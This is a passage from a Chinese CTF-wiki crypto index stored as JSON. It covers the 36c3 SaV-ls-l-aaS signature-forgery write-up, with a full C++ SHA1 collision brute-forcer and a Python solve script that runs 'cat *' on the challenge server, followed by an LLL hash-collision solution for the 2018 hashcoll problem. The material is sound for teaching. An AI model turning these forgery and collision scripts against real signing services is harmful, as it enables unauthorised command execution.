\u9ed8\u8ba4\u751f\u6210\uff0ce\u4e3a65537\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6c42\u516c\u56e0\u6570\u7684\u65b9\u5f0f\u6765\u6c42\u51fa n\u3002 \u5728\u5f97\u5230\u4e24\u7ec4\u7b7e\u540d\u540e\uff0c\u6211\u4eec\u8981\u5f97\u5230 RSA \u7684m\uff0c\u5c31\u662f\u586b\u5145\u540e\u7684\u6570\uff0c\u6240\u4ee5\u6309\u7167\u4ee3\u7801\u903b\u8f91\uff0c\u5728 go \u91cc\u9762\u5148\u662f sha1: msg := ip + \"|\" + cmd digest := sha1 . Sum ([] byte ( msg )) b := new ( bytes . Buffer ) err = json . NewEncoder ( b ). Encode ( string ( digest [:])) \u518d php \u91cc\u7684 md5\uff0c\u5f97\u5230\u4e24\u7ec4 m \u548c c\uff0c\u4f46\u662f\u603b\u662f\u6c42\u4e0d\u51fa\u516c\u56e0\u6570 n\uff0c\u6000\u7591\u6c42\u7684 m \u4e0d\u5bf9\u3002\u770b\u4ee3\u7801\u53d1\u73b0 go \u91cc\u628a sha1\u7684\u7ed3\u679c\u7528 json \u7f16\u7801\uff0c\u7136\u540e\u4f20\u5230 php\u91cc json \u89e3\u7801\u3002\u8fd9\u90e8\u5206\u975e\u5e38\u53ef\u7591\uff0c\u4e3a\u4f55\u8981\u7528 json \u7f16\u7801\uff08\u7528 hex \u4f20\u8fc7\u53bb\u5b83\u4e0d\u9999\u4e48\uff09\uff0c\u672c\u5730\u642d\u4e00\u4e0b\u73af\u5883\u8ddf\u4e00\u4e0b\u3002\uff08\u9898\u76ee\u7ed9\u4e86dockerfile\uff09 \u8d77\u4e2adocker\uff0c\u6539\u4e00\u4e0b index.php\uff0c\u52a0\u4e00\u4e2a var_dump($d); \uff0c\u518d\u6539\u4e00\u4e0b go\uff0c\u8fd4\u56de\u4e00\u4e0b php \u7684\u7ed3\u679c\uff1a fmt . Fprintln ( w , string ( body )) \u73b0\u5728\u8ba9\u7a0b\u5e8f\u7b7e\u540d\uff0c\u8fd4\u56de\u7ed3\u679c\uff1a string(38) \"\u000e \u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd\" \"K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\\/u1\\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\\/\\/h6I=\" oops, hsm is jsonless? $d \u7adf\u7136\u662f\u957f\u5ea6\u4e3a 38 \u7684\u5b57\u7b26\u4e32\uff0c\u770b\u6765\u679c\u7136\u662f\u8fd9\u91cc\u7f16\u7801\u6709\u95ee\u9898\uff0c\u6211\u4eec\u9700\u8981\u770b\u4e00\u4e0b\u6bcf\u4e2a\u6b65\u9aa4\u7684\u7ed3\u679c\uff0c\u5148\u770b\u4e00\u4e0b go \u91cc json\u7f16\u7801\u540e\u7684 sha1 \u7ed3\u679c\u662f\u4ec0\u4e48\uff1a package main import ( \"bytes\" \"crypto/sha1\" \"encoding/json\" \"fmt\" ) func main () { msg := \"172.17.0.1|ls -l\" digest := sha1 . Sum ([] byte ( msg )) b := new ( bytes . Buffer ) json . NewEncoder ( b ). Encode ( string ( digest [:])) fmt . Print ( string ( b . Bytes ())); } \u8fd0\u884c\u4e00\u4e0b\uff1a \"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\" \u548c\u6b63\u5e38\u7684sha1\u7684\u7ed3\u679c\u6765\u6bd4\u8f83\u4e00\u4e0b\uff1a Python 2 .7.16 ( default, Sep 2 2019 , 11 :59:44 ) [ GCC 4 .2.1 Compatible Apple LLVM 10 .0.1 ( clang-1001.0.46.4 )] on darwin Type \"help\" , \"copyright\" , \"credits\" or \"license\" for more information. >>> \"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\" '\\\\u000e\\t\\\\u001d\\\\ufffd\\\\u0012\\\\ufffd.\\\\ufffd\\\\ufffd\\\\ufffd?-\\\\ufffdKC\\\\ufffd\\\\u0005\\\\ufffd@\\\\ufffd' >>> from hashlib import * >>> sha1 ( '172.17.0.1|ls -l' ) .digest () '\\x0e\\t\\x1d\\xbd\\x12\\x90.\\xca\\xf0\\xd9?-\\x98KC\\xeb\\x05\\xa1@\\xd1' \u7531\u4e8e go \u7684 json \u7f16\u7801\uff0c\u5f88\u591a\u4e0d\u53ef\u89c1\u5b57\u7b26\u90fd\u88ab\u8f6c\u4e3a\u4e86 U+fffd \uff0c\u4e22\u5931\u4e86\u5f88\u591a\u4fe1\u606f\u3002 \u518d\u7ecf\u8fc7 php \u63a5\u53e3\u7684\u63a5\u6536\uff0c\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u7ed3\u679c\uff1a $d = json_decode(file_get_contents('php://input'), JSON_THROW_ON_ERROR); var_dump(file_get_contents('php://input')); var_dump($d); var_dump(bin2hex($d)); \u7ed3\u679c\uff1a string(89) \"\"\\u000e\\t\\u001d\\ufffd\\u0012\\ufffd.\\ufffd\\ufffd\\ufffd?-\\ufffdKC\\ufffd\\u0005\\ufffd@\\ufffd\" \" string(38) \"\u000e \u001d\ufffd\u0012\ufffd.\ufffd\ufffd\ufffd?-\ufffdKC\ufffd\u0005\ufffd@\ufffd\" string(76) \"0e091defbfbd12efbfbd2eefbfbdefbfbdefbfbd3f2defbfbd4b43efbfbd05efbfbd40efbfbd\" \"K4FEmxz4yuTsjDAbRZQmHJ+MBiCSGaOnpZTLbThXpCkDYe3siAIPfihX6ppjN2Tz6XqOr4tF\\/u1\\/+ccfhj8NNLIL+2hknyDXbosmMBV8mEGYsMqQHAE0f+3OhDWlzN5RnteSMYNZbTipFErB8ZOWCiXmynWxsqJhyaN9J6\\/\\/h6I=\" oops, hsm is jsonless? U+fffd \u53d8\u6210\u4e86 \\xef\\xbf\\xbd \u3002\u6240\u4ee5\u7531\u4e8e go \u7684 json \u7f16\u7801\u95ee\u9898\uff0c\u4e22\u5931\u4e86\u5f88\u591a\u4fe1\u606f\uff0c\u9020\u6210\u4e86 md5 \u524d\u7684\u6570\u636e\u6709\u5f88\u591a\u76f8\u540c\u5b57\u7b26\u3002\u5f53\u65f6\u505a\u9898\u65f6\u5f80\u4e0b\u5e76\u6ca1\u6709\u7ec6\u60f3\uff0c\u5f97\u5230 n \u540e\u603b\u662f\u60f3\u6784\u9020\u51fa\u4efb\u610f\u547d\u4ee4\u7684\u7b7e\u540d\uff0c\u4e5f\u5f88\u7591\u60d1\u5982\u679c\u6784\u9020\u51fa\u5c82\u4e0d\u662f\u8fd9\u79cd\u7b7e\u540d\u5c31\u4e0d\u5b89\u5168\u4e86\uff1f\u5176\u5b9e\u662f\u65e0\u6cd5\u5f97\u5230\u7684\u3002 \u6b63\u89e3\u662f go \u7684\u8fd9\u79cd\u95ee\u9898 \uff0c\u4e3a\u78b0\u649e\u521b\u9020\u4e86\u6761\u4ef6\u3002\u6211\u4eec\u53ef\u4ee5\u78b0\u649e\u51fa\u5728\u8fd9\u79cd\u7f16\u7801\u60c5\u51b5\u4e0b\u4e0e ls -l \u6709\u76f8\u540c\u7ed3\u679c\u7684 cat * \u6b64\u7c7b\u547d\u4ee4\u3002\u4f46\u662f\u95ee\u9898\u662f\u6211\u4eec\u9700\u8981\u975e\u5e38\u5927\u91cf ip \u6765\u63d0\u4f9b\u78b0\u649e\u7684\u6570\u636e\u3002 \u53ef\u4ee5\u53d1\u73b0\uff0cgo \u53d6 ip \u7684\u65f6\u5019\uff0c\u662f\u5148\u7528 net.ParseIP \u89e3\u6790\u4e86 ip\uff0c\u6211\u4eec\u5728 ip \u6bcf\u4e2a\u6570\u5b57\u524d\u9762\u52a0 0 \uff0c\u89e3\u6790\u540e\u8fd8\u662f\u539f\u6765\u7684 ip \u7ed3\u679c\uff0c\u6bcf\u4e2a\u6570\u5b57\u6700\u591a\u6dfb\u52a0 256 \u4e2a 0\uff0c\u56db\u4e2a\u6570\u5b57\u5c31\u5df2\u7ecf\u4ea7\u751f\u4e86 2^32 \u79cd\u4e0d\u540c\u7684\u7ec4\u5408\uff0c\u8db3\u4ee5\u78b0\u649e\u51fa ls -l \u4e0e cat * \u4e4b\u95f4\u7684\u51b2\u7a81\u3002 \u5b98\u65b9\u9898\u89e3\u7684 c++ \u78b0\u649e\u811a\u672c\u6211\u672c\u5730\u7f16\u8bd1\u7684\u6709\u70b9\u95ee\u9898\uff0c\u52a0\u4e86\u4e00\u4e9b\u5f15\u5165\u7684\u5934\u6587\u4ef6\uff1a // g++ -std=c++17 -march=native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt #include <cassert> #include <iomanip> #include <string> #include <sstream> #include <iostream> #include <functional> #include <random> #include <unordered_map> #include <algorithm> #include <thread> #include <atomic> #include <mutex> #include <array> #include <openssl/sha.h> const unsigned num_threads = std :: thread :: hardware_concurrency (); static std :: string hash ( std :: string const & s ) { SHA_CTX ctx ; if ( ! SHA1_Init ( & ctx )) throw ; if ( ! SHA1_Update ( & ctx , s . data (), s . length ())) throw ; std :: string d ( SHA_DIGEST_LENGTH , 0 ); if ( ! SHA1_Final (( uint8_t * ) & d [ 0 ], & ctx )) throw ; return d ; } static std :: u32string kapot ( std :: string const & s ) { std :: u32string r ( s . size (), 0 ); size_t o = 0 ; for ( size_t i = 0 ; i < s . length (); ) { auto T = []( uint8_t c ) { return ( c < 0x80 ) ? 1 /* ASCII */ : ( c & 0xc0 ) == 0x80 ? 0 /* continuation */ : ( c & 0xe0 ) == 0xc0 ? 2 /* 2-byte chunk */ : ( c & 0xf0 ) == 0xe0 ? 3 /* 3-byte chunk */ : ( c & 0xf8 ) == 0xf0 ? 4 /* 4-byte chunk */ : -1 ; }; uint32_t c = s [ i ++ ]; auto cont = [ & ]() { c = ( c << 6 ) | ( s [ i ++ ] & 0x3f ); }; switch ( T ( c )) { case -1 : case 0 : invalid : c = 0xfffd ; /* fall through */ case 1 : valid : r [ o ++ ] = c ; break ; case 2 : if ( c &= 0x1f , i + 0 >= s . size () || T ( s [ i + 0 ])) goto invalid ; goto one ; case 3 : if ( c &= 0x1f , i + 1 >= s . size () || T ( s [ i + 0 ]) || T ( s [ i + 1 ])) goto invalid ; goto two ; case 4 : if ( c &= 0x1f , i + 2 >= s . size () || T ( s [ i + 0 ]) || T ( s [ i + 1 ]) || T ( s [ i + 2 ])) goto invalid ; cont (); two : cont (); one : cont (); goto valid ; } } r . resize ( o ); return r ; } std :: atomic < uint64_t > hcount = 0 , kcount = 0 ; typedef std :: unordered_map < std :: u32string , std :: string > tab_t ; tab_t tab0 , tab1 ; std :: mutex mtx ; std :: array < uint8_t , 4 > ip ; std :: string cmd0 , cmd1 ; class stuffer_t { private : std :: array < size_t , 4 > cnts ; size_t step ; std :: string cmd ; public : stuffer_t ( size_t t , size_t s , std :: string c ) : cnts { t }, step ( s ), cmd ( c ) {} std :: string operator ()() { //XXX this is by far not the most efficient way of doing this, but yeah if ( ++ cnts [ 3 ] >= cnts [ 0 ]) { cnts [ 3 ] = 0 ; if ( ++ cnts [ 2 ] >= cnts [ 0 ]) { cnts [ 2 ] = 0 ; if ( ++ cnts [ 1 ] >= cnts [ 0 ]) { cnts [ 1 ] = 0 ; cnts [ 0 ] += step ; } } } std :: stringstream o ; for ( size_t i = 0 ; i < 4 ; ++ i ) o << ( i ? \".\" : \"\" ) << std :: string ( cnts [ i ], '0' ) << ( unsigned ) ip [ i ]; o << \"|\" << cmd ; return o . str (); } }; void go ( size_t tid ) { //XXX tid stuff is a hack, but YOLO bool one = tid & 1 ; stuffer_t next ( tid >> 1 , ( num_threads + 1 ) >> 1 , one ? cmd1 : cmd0 ); tab_t & mytab = one ? tab1 : tab0 ; tab_t & thtab = one ? tab0 : tab1 ; uint64_t myhcount = 0 , mykcount = 0 ; while ( 1 ) { std :: string r = next (); { ++ myhcount ; auto h = hash ( r ); if (( h . size () + 3 ) / 4 < ( size_t ) std :: count_if ( h . begin (), h . end (), []( unsigned char c ) { return c < 0x80 ; })) continue ; ++ mykcount ; auto k = kapot ( h ); if ( k . size () > 3 + ( size_t ) std :: count ( k . begin (), k . end (), 0xfffd )) continue ; std :: lock_guard < std :: mutex > lck ( mtx ); hcount += myhcount , myhcount = 0 ; kcount += mykcount , mykcount = 0 ; if ( thtab . find ( k ) != thtab . end ()) { mytab [ k ] = r ; std :: cerr << \" \\r\\x1b [K\" << \" \\x1b [32m\" ; std :: cout << tab0 [ k ] << std :: endl << tab1 [ k ] << std :: endl ; std :: cerr << \" \\x1b [0m\" ; std :: cerr << std :: hex ; bool first = true ; for ( uint32_t c : k ) std :: cerr << ( first ? first = false , \"\" : \" \" ) << c ; std :: cerr << std :: endl ; std :: cerr << std :: dec << \"hash count: \\x1b [35m\" << hcount << \" \\x1b [0m\" ; { std :: stringstream s ; s << std :: fixed << std :: setprecision ( 2 ) << log ( hcount | 1 ) / log ( 2 ); std :: cerr << \" (2^ \\x1b [35m\" << std :: setw ( 5 ) << s . str () << \" \\x1b [0m\" << \")\" << std :: endl ; } std :: cerr << \"kapot count: \" << \" \\x1b [35m\" << kcount << \" \\x1b [0m\" ; { std :: stringstream s ; s << std :: fixed << std :: setprecision ( 2 ) << log ( kcount | 1 ) / log ( 2 ); std :: cerr << \" (2^ \\x1b [35m\" << std :: setw ( 5 ) << s . str () << \" \\x1b [0m)\" << std :: endl ; } std :: cerr << \"table sizes: \\x1b [35m\" << tab0 . size () << \" \\x1b [0m \\x1b [35m\" << tab1 . size () << \" \\x1b [0m\" << std :: endl ; exit ( 0 ); } if ( mytab . size () < ( 1 << 20 )) mytab [ k ] = r ; } hcount += myhcount ; kcount += mykcount ; } } void status () { while ( 1 ) { { std :: lock_guard < std :: mutex > lck ( mtx ); std :: cerr << \" \\r\\x1b [K\" ; std :: cerr << \"hash count: \\x1b [35m\" << std :: setw ( 12 ) << hcount << \" \\x1b [0m \" ; { std :: stringstream s ; s << std :: fixed << std :: setprecision ( 2 ) << log ( hcount | 1 ) / log ( 2 ); std :: cerr << \"(2^ \\x1b [35m\" << std :: setw ( 5 ) << s . str () << \" \\x1b [0m) | \" ; } std :: cerr << \"kapot count: \\x1b [35m\" << std :: setw ( 12 ) << kcount << \" \\x1b [0m \" ; { std :: stringstream s ; s << std :: fixed << std :: setprecision ( 2 ) << log ( kcount | 1 ) / log ( 2 ); std :: cerr << \"(2^ \\x1b [35m\" << std :: setw ( 5 ) << s . str () << \" \\x1b [0m) | \" ; } std :: cerr << \"tables: \\x1b [35m\" << std :: setw ( 9 ) << tab0 . size () << \" \" << std :: setw ( 9 ) << tab1 . size () << \" \\x1b [0m \" << std :: flush ; } std :: this_thread :: sleep_for ( std :: chrono :: milliseconds ( 100 )); } } int main ( int argc , char ** argv ) { if ( argc < 2 ) { std :: cerr << \" \\x1b [31mneed IPv4 in argv[1] \\x1b [0m\" << std :: endl ; exit ( 1 ); } { std :: stringstream ss ( argv [ 1 ]); for ( auto & v : ip ) { std :: string s ; std :: getline ( ss , s , '.' ); int n = std :: atoi ( s . c_str ()); if ( n < std :: numeric_limits < uint8_t >:: min () || n > std :: numeric_limits < uint8_t >:: max ()) goto bad_ip ; v = n ; } if ( ! ss ) { bad_ip : std :: cerr << \" \\x1b [31mbad IPv4 given? \\x1b [0m\" << std :: endl ; exit ( 2 ); } } if ( argc < 4 ) { std :: cerr << \" \\x1b [31mneed commands in argv[2] and argv[3] \\x1b [0m\" << std :: endl ; exit ( 2 ); } cmd0 = argv [ 2 ]; cmd1 = argv [ 3 ]; std :: thread status_thread ( status ); std :: vector < std :: thread > ts ; for ( unsigned i = 0 ; i < num_threads ; ++ i ) ts . push_back ( std :: thread ( go , i )); for ( auto & t : ts ) t . join (); } \u7f16\u8bd1\u53ef\u80fd\u4f1a\u627e\u4e0d\u5230 lcrypto \uff0c\u7f16\u8bd1\u547d\u4ee4\u52a0\u4e0a lcrypto \u8def\u5f84\uff08\u6211\u672c\u5730\u662f /usr/local/opt/openssl/lib\uff09 g++ -std = c++17 -march = native -O3 -lcrypto -lpthread gewalt.cpp -o gewalt -L/usr/local/opt/openssl/lib \u4e0e go \u4ea4\u4e92\u7684\u811a\u672c\uff1a #!/usr/bin/env python3 import sys , requests , subprocess benign_cmd = 'ls -l' exploit_cmd = 'cat *' ip , port = sys . argv [ 1 ], sys . argv [ 2 ] url = 'http:// {} : {} ' . format ( ip , port ) my_ip = requests . get ( url + '/ip' ) . text print ( '[+] IP: ' + my_ip ) o = subprocess . check_output ([ './gewalt' , my_ip , benign_cmd , exploit_cmd ]) print ( '[+] gewalt:' + o . decode ()) payload = {} for l in o . decode () . splitlines (): ip , cmd = l . split ( '|' ) payload [ 'benign' if cmd == benign_cmd else 'pwn' ] = ip , cmd print ( payload ) sig = requests . post ( url + '/sign' , data = { 'ip' : payload [ 'benign' ][ 0 ], 'cmd' : payload [ 'benign' ][ 1 ]}) . text print ( '[+] sig: ' + sig ) r = requests . post ( url + '/exec' , data = { 'signature' : sig [: 172 ] + payload [ 'pwn' ][ 0 ] + '|' + payload [ 'pwn' ][ 1 ]}) print ( r . text ) \u2699 \ue0b0 SaV-ls-l-aaS \ue0b0 python solve.py 127 .0.0.1 60601 [ + ] IP: 172 .17.0.1 fffd fffd fffd fffd fffd fffd 55 fffd fffd fffd fffd c fffd fffd fffd fffd fffd fffd fffd fffd hash count: 168104875 ( 2 ^27.32 ) kapot count: 3477222 ( 2 ^21.73 ) table sizes: 8745 8856 [ + ] gewalt:00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 | ls -l 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172 .17.000000000000000000000000.0000000000000000000000000000000000000001 | cat * { 'pwn' : ( u '00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.17.000000000000000000000000.0000000000000000000000000000000000000001' , u 'cat *' ) , 'benign' : ( u '00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001' , u 'ls -l' )} [ + ] sig: ODxSukwtu4rHICBpzT23WGD7DCJNawhA0DUN/tcyv1AgwNmS8OPUnO5FnBBDgiaVx5OTYd4OjH8LVbKiXUBUBuFx1OHDgKBKG5umkKMLt+350SlgMWY5qWny9tPIU3I+X0A9FcADCBCi6f0PkXfc0CSCZXuFu9rAKnVGsbmaUwY = 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000172 .000000000000000000000000000000000000000000000000000000000000000000000000000000000000000017.000000000000000000000000000000000000000000000000000000000000000000000000000000000.00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 | ls -l hxp { FLAG } \u53c2\u8003\uff1a https://ctftime.org/writeup/17966","title":"2019 36c3 SaV-ls-l-aaS"},{"location":"crypto/hash/fnv/","text":"Fowler\u2013Noll\u2013Vo hash function \u00b6 \u5177\u4f53\u8bf7\u53c2\u89c1 https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function \u3002 2018 \u7f51\u9f0e\u676f hashcoll \u00b6 \u5176\u5b9e\u8fd9\u9053\u9898\u662f\u4ece NSU Crypto \u6284\u8fc7\u6765\u7684\uff0c https://nsucrypto.nsu.ru/archive/2017/problems_solution \uff0c\u5177\u4f53\u7684 wp \u4e4b\u524d hellman \u4e5f\u5199\u4e86\uff0c https://gist.github.com/hellman/9bf8376cd04e7a8dd2ec7be1947261e9 \u3002 \u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399 # 2**168 + 355 g = 374144419156711147060143317175368453031918731002211 L def shitty_hash ( msg ): h = h0 msg = map ( ord , msg ) for i in msg : h = ( h + i ) * g # This line is just to screw you up :)) h = h & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff return h - 0xe6168647f636 \u9898\u76ee\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa\u4e24\u4e2a\u6d88\u606f\uff0c\u5176\u54c8\u5e0c\u503c\u76f8\u540c\u3002\u5982\u679c\u6211\u4eec\u5c06\u8be5\u51fd\u6570\u5c55\u5f00\u7684\u8bdd\uff0c\u90a3\u4e48 hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256} hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256} \u5047\u8bbe\u4e24\u4e2a\u6d88\u606f\u7684 hash \u503c\u76f8\u540c\u90a3\u4e48 h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\equiv h_0g^n+y_1g^n+y_2g_{n-1}+...+y_ng\\bmod 2^{256} h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\equiv h_0g^n+y_1g^n+y_2g_{n-1}+...+y_ng\\bmod 2^{256} \u8fdb\u800c (x_1-y_1)g^{n-1}+(x_2-y_2)g^{n-2}+...+(x_n-y_n)g^0 \\equiv 0 \\bmod 2^{256} (x_1-y_1)g^{n-1}+(x_2-y_2)g^{n-2}+...+(x_n-y_n)g^0 \\equiv 0 \\bmod 2^{256} \u5373\u6211\u4eec\u53ea\u9700\u8981\u627e\u5230\u4e00\u4e2a n \u7ef4\u5411\u91cf z_i=x_i-y_i z_i=x_i-y_i \uff0c\u6ee1\u8db3\u4e0a\u8ff0\u7b49\u5f0f\u5373\u53ef\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5c06\u5176\u5316\u4e3a z_1g^{n-1}+z_2g^{n-2}+...+z_ng^0-k*2^{256}=0 z_1g^{n-1}+z_2g^{n-2}+...+z_ng^0-k*2^{256}=0 \u5373\u627e\u5230\u4e00\u7ec4\u5411\u91cf\u6ee1\u8db3\u4e0a\u8ff0\u8fd9\u4e2a\u5f0f\u5b50\u3002\u8fd9\u53ef\u4ee5\u8ba4\u4e3a\u662f LLL Paper \u4e2d\u7b2c\u4e8c\u4e2a\u4f8b\u5b50\u7684\u7b80\u5355\u60c5\u51b5\uff08\u53c2\u89c1\u683c\u95ee\u9898\u90e8\u5206\uff09\u3002 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5feb\u901f\u6784\u9020\u77e9\u9635\uff0c\u5982\u4e0b A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & Kg^{n-1} \\\\ 0 & 1 & 0 & \\cdots & 0 & Kg^{n-2} \\\\ 0 & 0 & 1 & \\cdots & 0 & Kg^{n-3} \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & K*mod \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & Kg^{n-1} \\\\ 0 & 1 & 0 & \\cdots & 0 & Kg^{n-2} \\\\ 0 & 0 & 1 & \\cdots & 0 & Kg^{n-3} \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & K*mod \\\\ \\end{matrix} \\right] \u4e4b\u540e\u6211\u4eec\u4f7f\u7528LLL \u7b97\u6cd5\u5373\u53ef\u83b7\u5f97\u4e24\u4e2a\u4e00\u6837\u7684\u54c8\u5e0c\u503c from sage.all import * mod = 2 ** 256 h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399 g = 2 ** 168 + 355 def shitty_hash ( msg ): h = h0 msg = map ( ord , msg ) for i in msg : h = ( h + i ) * g # This line is just to screw you up :)) h = h & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff return h - 0xe6168647f636 K = 2 ** 200 N = 50 base_str = 'a' * N base = map ( ord , base_str ) m = Matrix ( ZZ , N + 1 , N + 2 ) for i in xrange ( N + 1 ): ge = ZZ ( pow ( g , N - i , mod )) m [ i , i ] = 1 m [ i , N + 1 ] = ZZ ( ge * K ) m [ i , N + 1 ] = ZZ ( K * mod ) ml = m . LLL () ttt = ml . rows ()[ 0 ] print \"result:\" , ttt if ttt [ - 1 ] != 0 : print \"Zero not reached, increase K\" exit () else : msg = [] for i in xrange ( N ): msg . append ( base [ i ] + ttt [ i ]) if not ( 0 <= msg [ i ] <= 255 ): print \"Need more bytes!\" quit () print msg other = '' . join ( map ( chr , msg )) print shitty_hash ( base_str ) print shitty_hash ( other ) \u6ce8\u610f\u4e0d\u80fd\u76f4\u63a5\u4ec5\u4ec5\u4f7f\u7528 pow(g, N - i, mod)\uff0c\u4e0d\u7136\u751f\u6210\u7684\u6570\u4f1a\u5728 mod \u5bf9\u5e94\u7684\u57df\u4e2d\uff0c\u8fd9\u771f\u662f\u4e2a\u5927\u5751\u3002 \u5982\u4e0b \u279c hashcoll sage exp.sage result: ( 15 , -14, 17 , 14 , 6 , 0 , 12 , 21 , 8 , 29 , 6 , -4, -9, 10 , -2, -12, -6, 0 , -12, 13 , -28, -28, -24, -3, 6 , -5, -16, 15 , 17 , -14, 3 , -2, -16, -25, 3 , -21, -27, -9, 16 , 5 , -1, 0 , -3, -4, -4, -19, 6 , 8 , 0 , 0 , 0 , 0 ) [ 112 , 83 , 114 , 111 , 103 , 97 , 109 , 118 , 105 , 126 , 103 , 93 , 88 , 107 , 95 , 85 , 91 , 97 , 85 , 110 , 69 , 69 , 73 , 94 , 103 , 92 , 81 , 112 , 114 , 83 , 100 , 95 , 81 , 72 , 100 , 76 , 70 , 88 , 113 , 102 , 96 , 97 , 94 , 93 , 93 , 78 , 103 , 105 , 97 , 97 ] 106025341237231370726407656306665079105509255639964756437758376184556498283725 106025341237231370726407656306665079105509255639964756437758376184556498283725 \u5373\u6210\u529f\u3002","title":"Fowler\u2013Noll\u2013Vo hash function"},{"location":"crypto/hash/fnv/#fowlernollvo-hash-function","text":"\u5177\u4f53\u8bf7\u53c2\u89c1 https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function \u3002","title":"Fowler\u2013Noll\u2013Vo hash function"},{"location":"crypto/hash/fnv/#2018-hashcoll","text":"\u5176\u5b9e\u8fd9\u9053\u9898\u662f\u4ece NSU Crypto \u6284\u8fc7\u6765\u7684\uff0c https://nsucrypto.nsu.ru/archive/2017/problems_solution \uff0c\u5177\u4f53\u7684 wp \u4e4b\u524d hellman \u4e5f\u5199\u4e86\uff0c https://gist.github.com/hellman/9bf8376cd04e7a8dd2ec7be1947261e9 \u3002 \u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399 # 2**168 + 355 g = 374144419156711147060143317175368453031918731002211 L def shitty_hash ( msg ): h = h0 msg = map ( ord , msg ) for i in msg : h = ( h + i ) * g # This line is just to screw you up :)) h = h & 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff return h - 0xe6168647f636 \u9898\u76ee\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa\u4e24\u4e2a\u6d88\u606f\uff0c\u5176\u54c8\u5e0c\u503c\u76f8\u540c\u3002\u5982\u679c\u6211\u4eec\u5c06\u8be5\u51fd\u6570\u5c55\u5f00\u7684\u8bdd\uff0c\u90a3\u4e48 hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256} hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256} \u5047\u8bbe\u4e24\u4e2a\u6d88\u606f\u7684 hash \u503c\u76f8\u540c\u90a3\u4e48 h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\equiv h_0g^n+y_1g^n+y_2g_{n-1}+...+y_ng\\bmod 2^{256} h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\equiv h_0g^n+y_1g^n+y_2g_{n-1}+...+y_ng\\bmod 2^{256} \u8fdb\u800c (x_1-y_1)g^{n-1}+(x_2-y_2)g^{n-2}+...+(x_n-y_n)g^0 \\equiv 0 \\bmod 2^{256} (x_1-y_1)g^{n-1}+(x_2-y_2)g^{n-2}+...+(x_n-y_n)g^0 \\equiv 0 \\bmod 2^{256} \u5373\u6211\u4eec\u53ea\u9700\u8981\u627e\u5230\u4e00\u4e2a n \u7ef4\u5411\u91cf z_i=x_i-y_i z_i=x_i-y_i \uff0c\u6ee1\u8db3\u4e0a\u8ff0\u7b49\u5f0f\u5373\u53ef\uff0c\u6211\u4eec\u53ef\u4ee5\u8fdb\u4e00\u6b65\u5c06\u5176\u5316\u4e3a z_1g^{n-1}+z_2g^{n-2}+...+z_ng^0-k*2^{256}=0 z_1g^{n-1}+z_2g^{n-2}+...+z_ng^0-k*2^{256}=0 \u5373\u627e\u5230\u4e00\u7ec4\u5411\u91cf\u6ee1\u8db3\u4e0a\u8ff0\u8fd9\u4e2a\u5f0f\u5b50\u3002\u8fd9\u53ef\u4ee5\u8ba4\u4e3a\u662f LLL Paper 